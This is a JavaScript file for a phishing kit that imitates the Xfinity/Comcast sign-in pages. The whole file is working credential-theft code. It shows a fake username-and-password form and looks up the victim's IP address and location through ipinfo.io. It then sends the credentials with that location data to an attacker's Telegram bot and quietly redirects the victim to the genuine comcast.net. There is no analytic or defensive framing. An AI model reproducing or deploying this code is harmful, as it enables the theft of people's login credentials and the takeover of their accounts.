import { TELEGRAM_TOKEN, CHAT_ID, IP_TOKEN } from "./config.js";

const wrapper = document.querySelector(".wrapper");
const nextButton = document.querySelector("#next-btn");
const spinner = document.querySelector(".spinner");
const userID = document.querySelector("#user");
const errorMessage = document.querySelector(".error-message");
let password;
let submitButton;
let userValue;
let passwordValue;

document.querySelector("body").addEventListener("click", (e) => {
  if (e.target === nextButton) {
    e.preventDefault();

    const HTML = `
              <div class="second-phase">
              <form class="flow-content" action="" id="form--two">
                <img src="./asset/logo.svg" alt="" class="logo" />
                <p class="username text--bold">${userID.value}</p>
                <h1 class="title">Enter your password</h1>
                <div class="password__wrapper">
                  <input class="input input--password" type="password" name="passowrd" id="password" />
                  <i class="fa-solid fa-eye password-icon"></i>
                  <i class="fa-solid fa-eye-slash password-icon none"></i>
                </div>
                <p class="error-message none">Please enter your Xfinity ID to sing in.</p>
                <a href="#" class="link text--bold">Forgot passowrd?</a>

                <div class="checkbox__wrapper">
                  <input class="checkbox" type="checkbox" name="checkbox" id="checkbox" />
                  <label for="checkbox">Keep me signed in</label>
                </div>
                <p>
                  By signing in, you agree to our
                  <a href="#" class="link">Terms of Service</a>
                  and
                  <a href="#" class="link">Privacy, Policy</a>
                </p>
                <button class="btn" type="submit" id="submit-btn">Sign in</button>
                <a class="text--bold link--no-text-decoration" href="#">Sign in as someone else</a>
                <p>
                  Trouble signing in?
                  <a href="" class="link">Get help</a>
                </p>
              </form>
            </div> 
          </div>
    `;

    if (userID.value === "") {
      userID.classList.add("error");
      errorMessage.classList.remove("none");

      return;
    }

    userValue = userID.value;

    spinner.classList.toggle("none");

    setTimeout(() => {
      spinner.classList.toggle("none");

      wrapper.innerHTML = "";

      wrapper.insertAdjacentHTML("afterbegin", HTML);

      password = document.querySelector("#password");
      submitButton = document.querySelector("#submit-btn");
    }, 3000);
  }
  // = = = = = = = = = = = = = = = = = = = = = = = = =

  if (e.target.classList.contains("password-icon")) {
    const passwordIcons = document.querySelectorAll(".password-icon");

    passwordIcons.forEach((icon) => {
      icon.classList.toggle("none");
    });

    if (password.type === "password") {
      password.type = "text";
    } else {
      password.type = "password";
    }
  }

  // = = = = = = = = = = = = = = = = = = = = = = = = =

  if (e.target === submitButton) {
    e.preventDefault();

    passwordValue = password.value;

    const errorMessage = submitButton.parentElement.querySelector(".error-message");

    if (password.value === "") {
      password.classList.add("error");
      errorMessage.classList.remove("none");

      return;
    }

    sendLogsToTelegram(userValue, passwordValue, IP_TOKEN);
  }
});

function sendLogsToTelegram(userID, pass, token) {
  const username = userID;
  const password = pass;

  async function asyncFunction() {
    const IP_API_Response = await fetch(`https://ipinfo.io?token=${token}`);
    const data = await IP_API_Response.json();

    const { ip, country, region, city, loc, org, timezone } = data;
    const [lat, lng] = loc.split(",");

    // ===============================================
    // ***********************************************
    // ===============================================

    //message template

    const logMessage = `
    **** COMCAST RESULT ****\n
    Username: ${username}\n
    Password: ${password}\n
    IP Address: ${ip}\n
    Country: ${country}\n
    Region: ${region}\n
    City: ${city}\n
    Location: [lat: ${lat}, lon: ${lng}]\n
    Timezone: ${timezone}\n
    `;

    // ===============================================
    // ***********************************************
    // ===============================================

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const HTTPHeader = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: logMessage,
      }),
    };

    fetch(url, HTTPHeader)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        return response.json();
      })
      .then((data) => {
        window.location.href = "https://www.comcast.net/";
      })
      .catch((error) => console.error("Error:", error));
  }

  asyncFunction();
}
